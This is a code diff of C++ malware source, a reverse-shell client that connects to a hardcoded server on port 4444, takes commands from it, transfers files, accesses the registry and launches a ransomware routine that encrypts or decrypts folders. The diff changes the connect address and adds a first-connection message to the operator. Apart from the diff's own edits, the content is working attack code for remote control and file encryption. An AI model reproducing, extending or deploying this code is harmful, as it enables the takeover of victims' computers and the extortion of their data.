@@ -9,25 +9,25 @@
 #include "WindowsService.h"
 #include "Ransomware.h"
 
-Client::Client()
+Client::Client(std::string& connectionMessage)
 	: ReverseShellStandard()
 {
 	Connect();
-	Start();
+	Start(connectionMessage);
 	m_ioService.run();
 }
 
-void Client::Connect() 
+void Client::Connect()
 {
 	using TcpResolver = boost::asio::ip::tcp::resolver;
 	TcpResolver resolver(m_ioService);
-	auto endpointIterator = resolver.resolve({ "192.168.8.101", "4444" }); //192.168.8.101
+	auto endpointIterator = resolver.resolve({ "192.168.8.115", "4444" });
 
 	while (true)
 	{
 		boost::asio::connect(m_socket, endpointIterator, m_errorCode);
 		if (!m_errorCode)
-			return;
+			break;
 
 		std::cout << "Coudn't connect to server. Check that it is up and listening " << std::endl;
 		m_socket.close();
@@ -37,8 +37,10 @@ void Client::Connect()
 	std::cout << "Connected to: " << m_socket.remote_endpoint().address().to_string() << std::endl;
 }
 
-void Client::Start()
+void Client::Start(std::string& connectionMessage)
 {
+	FirstConnectionMessage(connectionMessage);
+
 	while (true)
 	{
 		switch (ReadOperationType())
@@ -68,6 +70,12 @@ void Client::Start()
 
 		m_responseBuf.consume(m_responseBuf.size());
 	}
+}
+
+void Client::FirstConnectionMessage(std::string& connectionMessage)
+{
+	Send(connectionMessage);
+	connectionMessage.clear();
 }
 
 Client::OperationType Client::ReadOperationType() 
@@ -126,7 +134,7 @@ void Client::DownloadFile()
 
 bool Client::TellServerIfFileExists(const std::string& filePath)
 {
-	auto fileExists = IsRegularFileExists(filePath);
+	auto fileExists = FileEncryptionDecisions::IsRegularFileExists(filePath);
 	Send(fileExists);
 	return fileExists;
 }
@@ -154,8 +162,8 @@ long Client::StartRansomware(const std::string& operation, const std::string& st
 {
 	if (operation == "1")
 		return Ransomware(startFolder, Ransomware::Encrypt).Start();
-	else	 
-		return Ransomware(startFolder, Ransomware::Decrypt).Start();
+
+	return Ransomware(startFolder, Ransomware::Decrypt).Start();
 }
 
 void Client::AccessRegistry()
